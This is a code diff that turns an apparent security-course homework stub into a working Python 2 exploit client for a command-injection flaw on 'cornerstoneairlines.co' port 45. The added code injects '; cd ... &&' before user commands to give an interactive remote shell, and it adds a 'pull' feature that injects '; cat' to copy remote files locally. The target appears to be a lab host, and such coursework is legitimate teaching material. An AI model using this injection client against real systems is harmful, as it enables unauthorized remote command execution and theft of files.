@@ -1,37 +1,71 @@
-"""
-    Use the same techniques such as (but not limited to):
-        1) Sockets
-        2) File I/O
-        3) raw_input()
-
-    from the OSINT HW to complete this assignment. Good luck!
-"""
-
 import socket
+import re
+host = "cornerstoneairlines.co" 
+port = 45 
+curr_path ="/"
 
-host = "cornerstoneairlines.co" # IP address here
-port = 45 # Port here
+def execute_cmd():
+    global curr_path
+    while True:
+        command = raw_input(curr_path+">").strip()   
+        if command == "exit":
+            return 
+        
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        data = s.recv(1024)
+        
+        
 
-def execute_cmd(cmd):
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+        if command.startswith("cd"):        
+            output = "; cd "+curr_path+" && "+command+ " && pwd"     
+            s.send(output+"\n")
+            data = s.recv(1024).strip()
+            if len(data) != 0:
+                curr_path= data
+        
+        elif len(command.strip()) !=0:
+            output = "; cd "+curr_path+ " &&"+command   
+            s.send(output+"\n")
+            print(s.recv(1024).strip())
+        else: 
+            pass
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
-
-            Reading:
-
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
-
-            Sending:
-
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
 
 
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+    while True:
+        
+        command = raw_input(">").strip()
+    
+        if len(command) == 0:
+            pass
+        elif command == "shell":
+            execute_cmd()
+            
+        elif command == "quit":
+            exit()
+        elif command.startswith("pull") and len(command.split()) == 3: 
+            p = command.split()
+            remote = p[1]
+            local = p[2]
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, port))
+            data = s.recv(1024)
+            output = "; cat "+ remote 
+            s.send(output+"\n")
+            download = s.recv(1024)
+            with open(local,"w+") as down:
+                down.write(download)
+
+        else:
+            print("""
+                     1)  shell                              Drop into an interactive shell and allow 
+                                                            users to gracefully `exit`
+                     2)  pull <remote-path> <local-path>    Download files
+                     3)  help                               Shows this help menu
+                     4)  quit                               Quit the shell 
+            """)
+
+
+
